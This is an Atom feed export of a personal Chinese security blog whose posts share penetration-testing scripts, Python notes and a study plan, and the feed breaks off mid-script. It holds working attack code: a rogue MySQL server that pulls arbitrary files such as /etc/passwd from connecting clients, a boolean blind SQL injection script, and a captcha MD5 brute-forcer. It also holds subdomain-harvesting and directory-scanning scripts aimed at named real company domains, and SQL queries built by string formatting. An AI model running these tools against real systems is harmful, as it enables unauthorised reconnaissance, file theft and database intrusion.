<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s blog</title>
  
  <subtitle>Kage&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-18T10:28:26.004Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>个人渗透脚本整理</title>
    <link href="http://yoursite.com/2019/10/18/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E8%84%9A%E6%9C%AC%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2019/10/18/个人渗透脚本整理/</id>
    <published>2019-10-18T10:28:25.000Z</published>
    <updated>2019-10-18T10:28:26.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="子域名类"><a href="#子域名类" class="headerlink" title="子域名类"></a>子域名类</h2><h3 id="子域名匹配及后续处理"><a href="#子域名匹配及后续处理" class="headerlink" title="子域名匹配及后续处理"></a>子域名匹配及后续处理</h3><p>有三个函数，第一个函数利用正则匹配re库来对各个网页搜寻到的子域名进行匹配。<br>第二个函数将子域名入库，并进行去重操作。<br>第三个函数将数据库的子域名表导出到文件当中来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import pymysql</span><br><span class="line"># 程序功能：将字符串中的域名验证是否重复，再插入数据库中。</span><br><span class="line"></span><br><span class="line"># 输入：字符串，返回：匹配子域名的数组</span><br><span class="line">def getDomain(string):</span><br><span class="line">pattern = re.compile(r&quot;[\w\.]*?\.ymm56\.com|[\w\.]*?\.ymmoa\.com|[\w\.]*?\.56qq\.com|[\w\.]*?\.56qq\.cn&quot;);</span><br><span class="line">result = re.findall(pattern,string)</span><br><span class="line">return result</span><br><span class="line"></span><br><span class="line"># 输入：list，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(l):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into ymm(name) values (&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"># 输入：表，功能：将表项子域名输出到txt文本中</span><br><span class="line">def file(table):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(&quot;select * from %s&quot; % table)</span><br><span class="line">result = cursor.fetchall()</span><br><span class="line">string = &quot;&quot;</span><br><span class="line">for row in result:</span><br><span class="line">string += row[1] + &quot;\n&quot;</span><br><span class="line">with open(&quot;./%s.txt&quot; % table,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(string)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">file(&quot;ymm&quot;)</span><br></pre></td></tr></table></figure></p><h3 id="子域名dns验证"><a href="#子域名dns验证" class="headerlink" title="子域名dns验证"></a>子域名dns验证</h3><p>对抓获的子域名，有些可能是过期的，可以利用该脚本进行dns解析来判断子域名是否可以访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line"># 输入：子域名表名 功能：将dns解析不到的子域名删除</span><br><span class="line">def filterDns(table = &quot;ymm&quot;):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">sql = &quot;select * from %s&quot; % table</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">data = cursor.fetchall()</span><br><span class="line">for row in data:</span><br><span class="line">try:</span><br><span class="line">socket.gethostbyname(row[1].strip())</span><br><span class="line">except:</span><br><span class="line">print(&quot;no:&quot;+row[1])</span><br><span class="line">sql = &quot;delete from %s where name=&apos;%s&apos;&quot; % (table,row[1])</span><br><span class="line">print(sql)</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line">filterDns(&apos;ymm&apos;)</span><br></pre></td></tr></table></figure></p><h2 id="目录扫描类"><a href="#目录扫描类" class="headerlink" title="目录扫描类"></a>目录扫描类</h2><h3 id="多线程dirsearch"><a href="#多线程dirsearch" class="headerlink" title="多线程dirsearch"></a>多线程dirsearch</h3><p>该脚本可以对搜寻到的子域名，多线程进行扫描，速度效果都不错，要求平台linux<br>输入子域名文件，输出指定位置json文件，和扫描信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import time, threading</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def myfunction(domain):</span><br><span class="line">print(&quot;thread %s is running&quot; % threading.current_thread().name)</span><br><span class="line">url = &quot;http://&quot; + domain</span><br><span class="line">try:</span><br><span class="line">requests.get(url,timeout=3)</span><br><span class="line">except:</span><br><span class="line">url = &quot;https://&quot; + domain</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">requests.get(url,timeout=3)</span><br><span class="line">except:</span><br><span class="line">print(&quot;%s fail&quot;%domain)</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">payload = &quot;python3 /root/tool/dirsearch/dirsearch.py -u %s -e all --json-report=./output/%s.json&gt;./txt/%s.txt&quot; % (url,domain,domain)</span><br><span class="line">os.system(payload)</span><br><span class="line">print(&quot;thread %s is ended&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(l):</span><br><span class="line">lwork = []</span><br><span class="line">for i in range(0,10):</span><br><span class="line">domain = l[i].strip()</span><br><span class="line">t = threading.Thread(target=myfunction,name=domain,args=(domain,)) </span><br><span class="line">t.start()</span><br><span class="line">lwork.append(t)</span><br><span class="line"></span><br><span class="line">for i in lwork:</span><br><span class="line">i.join()</span><br><span class="line">print(&quot;ok&quot;)</span><br><span class="line"></span><br><span class="line">with open(&quot;./ymm.txt&quot;) as fp:</span><br><span class="line">l = fp.readlines()</span><br><span class="line"></span><br><span class="line">for i in range(13,len(l)/10):</span><br><span class="line">print(&quot;[*]%d turn is start&quot; % i)</span><br><span class="line">run(l[i*10:i*10+10])</span><br><span class="line">print(&quot;[*]%d turn finished&quot; % i)</span><br></pre></td></tr></table></figure></p><h3 id="对dirsearch扫描结果进行打分排序"><a href="#对dirsearch扫描结果进行打分排序" class="headerlink" title="对dirsearch扫描结果进行打分排序"></a>对dirsearch扫描结果进行打分排序</h3><p>对上述扫描得到的json文件进行打分排序，方便我们更有效率的搜寻漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">domain = &quot;about.56qq.cn&quot;</span><br><span class="line"></span><br><span class="line">#input:domain function:filter and star</span><br><span class="line">def check(domain):</span><br><span class="line">url = &quot;http://%s:80/&quot; % domain</span><br><span class="line"></span><br><span class="line">with open(&quot;./output/%s.json&quot; % domain,&quot;rb&quot;) as fp:</span><br><span class="line">filejson = json.load(fp)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">l = filejson[url]</span><br><span class="line">except:</span><br><span class="line">url = &quot;https://%s:443/&quot; % domain</span><br><span class="line">try:</span><br><span class="line">l = filejson[url]</span><br><span class="line">except:</span><br><span class="line">print(&quot;%s fail&quot; % domain)</span><br><span class="line"></span><br><span class="line">lengths = []</span><br><span class="line">lengths.append(l[0][&apos;content-length&apos;])</span><br><span class="line"></span><br><span class="line">star = 0</span><br><span class="line">result = []</span><br><span class="line">flag = [0,0,0,0]</span><br><span class="line">for row in l:</span><br><span class="line">length = row[&apos;content-length&apos;]</span><br><span class="line">status = row[&apos;status&apos;]/100</span><br><span class="line">if length in lengths:</span><br><span class="line">continue</span><br><span class="line"></span><br><span class="line">lengths.append(length)</span><br><span class="line">if status == 2:</span><br><span class="line">star += 4</span><br><span class="line">elif status == 3 and flag[1]&lt;3:</span><br><span class="line">star += 2</span><br><span class="line">flag[1] +=1</span><br><span class="line">elif status == 5 and flag[2]&lt;3:</span><br><span class="line">star += 2</span><br><span class="line">flag[2] += 1</span><br><span class="line">elif status == 4 and flag[2]&lt;3:</span><br><span class="line">star +=1</span><br><span class="line">flag[3] += 1</span><br><span class="line">result.append(row)</span><br><span class="line"></span><br><span class="line">return (domain,star,result)</span><br><span class="line"></span><br><span class="line">def takeSecond(elem):</span><br><span class="line">    return elem[1]</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">files = os.listdir(&quot;./output&quot;)</span><br><span class="line">result = []</span><br><span class="line">for i in files:</span><br><span class="line">result.append(check(i[:-5]))</span><br><span class="line"></span><br><span class="line">result.sort(key=takeSecond)</span><br><span class="line">result.reverse()</span><br><span class="line">for i in result:</span><br><span class="line">print(i[:-1])</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;子域名类&quot;&gt;&lt;a href=&quot;#子域名类&quot; class=&quot;headerlink&quot; title=&quot;子域名类&quot;&gt;&lt;/a&gt;子域名类&lt;/h2&gt;&lt;h3 id=&quot;子域名匹配及后续处理&quot;&gt;&lt;a href=&quot;#子域名匹配及后续处理&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>2019下半年计划</title>
    <link href="http://yoursite.com/2019/10/16/2019%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%AE%A1%E5%88%92/"/>
    <id>http://yoursite.com/2019/10/16/2019下半年计划/</id>
    <published>2019-10-15T18:03:08.000Z</published>
    <updated>2019-10-15T18:03:08.881Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安全范围很大，自己也有点贪心，最近一段时间自己学的也比较范。写个规划相当于指明个方向，让自己更加有计划性的学习。</p><h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><ol><li>坚持更新博客</li><li>开始学习java web编程</li><li>每天实战渗透练练手<br> 从实战中遇到问题来进行学习<br> 多魔改工具，实现自动化测试</li><li>背单词 ，高数上复习</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;安全范围很大，自己也有点贪心，最近一段时间自己学的也比较范。写个规划相当于指明个方向，让自己更加有计划性的学习。&lt;/p&gt;
&lt;h2 id=&quot;规
      
    
    </summary>
    
      <category term="规划" scheme="http://yoursite.com/categories/%E8%A7%84%E5%88%92/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python编程总结</title>
    <link href="http://yoursite.com/2019/10/16/python%E7%BC%96%E7%A8%8B%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/10/16/python编程总结/</id>
    <published>2019-10-15T17:51:33.000Z</published>
    <updated>2019-10-15T17:51:33.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python操作mysql数据库"><a href="#python操作mysql数据库" class="headerlink" title="python操作mysql数据库"></a>python操作mysql数据库</h2><p>查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pymysql</span><br><span class="line">db = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;subdomain&quot;)</span><br><span class="line">cursor = db.cursor()</span><br><span class="line">cursor.execute(&quot;select version&quot;)</span><br><span class="line">data = cursor.fetchone()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure></p><p>插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;tool&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in l:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into maodou(name) values (&apos;%s&apos;)&quot; % name)</span><br><span class="line">except:</span><br><span class="line">print(&quot;子域名重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="python文件操作"><a href="#python文件操作" class="headerlink" title="python文件操作"></a>python文件操作</h2><p>写文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;./subdomain.txt&quot;,&quot;a&quot;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">fp.write(&quot;6666&quot;)</span><br></pre></td></tr></table></figure></p><p>读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(path,&apos;r&apos;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">s = fp.read()</span><br></pre></td></tr></table></figure></p><h2 id="dns解析域名"><a href="#dns解析域名" class="headerlink" title="dns解析域名"></a>dns解析域名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">print(socket.gethostbyname(&apos;host&apos;))</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">def myfunction(arg1):</span><br><span class="line">print(&quot;thread %s is running\n&quot; % threading.current_thread().name)</span><br><span class="line">print(arg1)</span><br><span class="line">print(&quot;thread %s is ended\n&quot; % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">t = threading.Thread(target=myfunction,name=str(i),args=(i,)) </span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python操作mysql数据库&quot;&gt;&lt;a href=&quot;#python操作mysql数据库&quot; class=&quot;headerlink&quot; title=&quot;python操作mysql数据库&quot;&gt;&lt;/a&gt;python操作mysql数据库&lt;/h2&gt;&lt;p&gt;查询&lt;br&gt;&lt;figure 
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python脚本(不定时更新)</title>
    <link href="http://yoursite.com/2019/10/16/python%E8%84%9A%E6%9C%AC(%E4%B8%8D%E5%AE%9A%E6%97%B6%E6%9B%B4%E6%96%B0)/"/>
    <id>http://yoursite.com/2019/10/16/python脚本(不定时更新)/</id>
    <published>2019-10-15T17:49:03.000Z</published>
    <updated>2019-10-15T17:49:03.362Z</updated>
    
    <content type="html"><![CDATA[<h2 id="md5验证码"><a href="#md5验证码" class="headerlink" title="md5验证码"></a>md5验证码</h2><p>python3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line"></span><br><span class="line"># MD5截断数值已知 求原始数据</span><br><span class="line"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span><br><span class="line"></span><br><span class="line">def md5(s):  # 计算MD5字符串</span><br><span class="line">    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = &apos;bd5c2&apos;   #已知的md5截断值</span><br><span class="line">md5start = 0   # 设置题目已知的截断位置</span><br><span class="line">md5length = 5</span><br><span class="line"></span><br><span class="line">def findmd5(sss):    # 输入范围 里面会进行md5测试</span><br><span class="line">    key = sss.split(&apos;:&apos;)</span><br><span class="line">    start = int(key[0])   # 开始位置</span><br><span class="line">    end = int(key[1])    # 结束位置</span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(start, end):</span><br><span class="line">        # print(md5(i)[md5start:md5length])</span><br><span class="line">        if md5(str(i)+&apos;Nu1L&apos;)[0:5] == keymd5:            # 拿到加密字符串</span><br><span class="line">            result = i</span><br><span class="line">            print(result)    # 打印</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list=[]  # 参数列表</span><br><span class="line">for i in range(10):   # 多线程的数字列表 开始与结尾</span><br><span class="line">    list.append(str(10000000*i) + &apos;:&apos; + str(10000000*(i+1)))</span><br><span class="line">pool = ThreadPool()    # 多线程任务</span><br><span class="line">pool.map(findmd5, list) # 函数 与参数列表</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure></p><h2 id="mysql客户端任意文件读取"><a href="#mysql客户端任意文件读取" class="headerlink" title="mysql客户端任意文件读取"></a>mysql客户端任意文件读取</h2><p>python2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def my_len(s):</span><br><span class="line">    return chr(len(s)+1)</span><br><span class="line"># linux :</span><br><span class="line">#filestring = &quot;/etc/passwd&quot;</span><br><span class="line"># windows:</span><br><span class="line">#filestring = &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot;</span><br><span class="line">HOST = &quot;0.0.0.0&quot; # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3306</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = &quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = &quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = &quot;\x0c&quot;</span><br><span class="line">padding = &quot;\x00\x00&quot;</span><br><span class="line">payload = payloadlen + padding + &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"># print(&quot;payload1:&quot;+payload)</span><br><span class="line">file = raw_input(&quot;file:&quot;)</span><br><span class="line">l = my_len(file) </span><br><span class="line">payload = l + padding + &quot;\x01\xfb&quot; + file</span><br><span class="line"></span><br><span class="line"># &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print &apos;Connection from:&apos;, addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print &quot; &quot;.join(&quot;%02x&quot; % ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print &quot;[*] Payload send!&quot;</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print &quot;Data received:&quot;, data</span><br><span class="line">        break</span><br><span class="line">    # Don&apos;t leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/js/scms.php&quot;;</span><br><span class="line">payload_len = &quot;1\nand\nlength(database())&lt;%d\n#&quot;</span><br><span class="line">payload = &quot;1\nand\nascii(substr(database(),%d,1))&lt;%%d\n#&quot;</span><br><span class="line"></span><br><span class="line">true_str = &quot;20151019102732946.jpg&quot;</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">    if flag==1:</span><br><span class="line">        list = range(50)</span><br><span class="line">    else:</span><br><span class="line">        list = range(32,127)</span><br><span class="line">    low = 0</span><br><span class="line">    high = len(list)-1</span><br><span class="line">    while low&lt;=high: </span><br><span class="line">        mid = (int)((low+high)/2)</span><br><span class="line">        guess = list[mid]</span><br><span class="line">        print(list[low],guess,list[high])</span><br><span class="line">        # print((payload % guess).replace(&apos; &apos;,&apos;%0A&apos;))</span><br><span class="line">        data = &#123;&apos;action&apos;:&apos;jssdk&apos;,&apos;pageid&apos;:(payload % guess).replace(&apos; &apos;,&quot;%0A&quot;),&apos;pagetype&apos;:&apos;text&apos;,&#125;</span><br><span class="line">        html = requests.post(url,data).text</span><br><span class="line">        # print(html)</span><br><span class="line">        if true_str in html:</span><br><span class="line">            high = mid - 1</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        if low &gt; 